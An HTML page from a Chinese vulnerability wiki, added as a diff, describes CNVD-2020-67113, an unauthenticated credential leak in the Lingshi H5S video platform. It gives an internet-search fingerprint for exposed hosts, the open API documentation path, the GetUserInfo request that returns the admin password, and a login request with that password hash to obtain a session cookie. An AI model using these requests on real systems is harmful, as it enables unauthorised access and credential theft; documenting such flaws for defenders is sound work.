@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80%20H5S%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0%20GetUserInfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%20%20CNVD-2020-67113/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>零视科技 H5S视频平台 GetUserInfo 信息泄漏漏洞 CNVD-2020-67113 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u96f6\u89c6\u79d1\u6280 H5S\u89c6\u9891\u5e73\u53f0 GetUserInfo \u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e CNVD-2020-67113", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%20VA%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%20VA%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        霆智科技 VA虚拟应用平台 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81RCE/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81RCE/" class="btn btn-xs btn-link">
+        多个防火墙产品RCE
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="h5s-getuserinfo-cnvd-2020-67113">零视科技 H5S视频平台 GetUserInfo 信息泄漏漏洞  CNVD-2020-67113<a class="headerlink" href="#h5s-getuserinfo-cnvd-2020-67113" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>零视技术(上海)有限公司是以领先的视频技术服务于客户，致力于物联网视频开发简单化，依托于HTML5 WebRTC 等新的技术，实现全平台视频播放简单化。
+零视技术(上海)有限公司H5S CONSOLE存在未授权访问漏洞。攻击者可利用漏洞访问后台相应端口，执行未授权操作。</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>零视科技 H5S视频平台</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>title="H5S视频平台|WEB"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1636073252475-8f3cb570-d930-46e3-b8a6-0a686773c84a.png" /></p>
+<p>API文档可以未授权访问</p>
+<div class="highlight"><pre><span></span><code><span class="x">/doc/api.html</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1636074612323-f1fee2de-e43f-4842-9e03-8066f9a1b7fc.png" /></p>
+<p>存在用户账号密码泄漏的接口</p>
+<div class="highlight"><pre><span></span><code><span class="x">/api/v1/GetUserInfo?user=admin&amp;session=</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1636073746405-1adf993c-1e08-461a-9f7f-a3ab07f969ad.png" /></p>
+<p>其中登录接口中 Password为接口中存在的账号密码，可以直接发送请求获取Cookie</p>
+<div class="highlight"><pre><span></span><code><span class="x">/api/v1/Login?user=admin&amp;password=02ed400b8d9289f311fc1d68a83fdaaa</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1636073812938-d82c758c-891a-40aa-9e17-037339b99765.png" /></p>
+<p>请求成功后访问主页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1636073852540-6758c6d5-f945-4aec-8c53-53328c3cbc7d.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%20VA%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80%20VA%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        霆智科技 VA虚拟应用平台 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81RCE/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81RCE/" class="btn btn-xs btn-link">
+        多个防火墙产品RCE
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
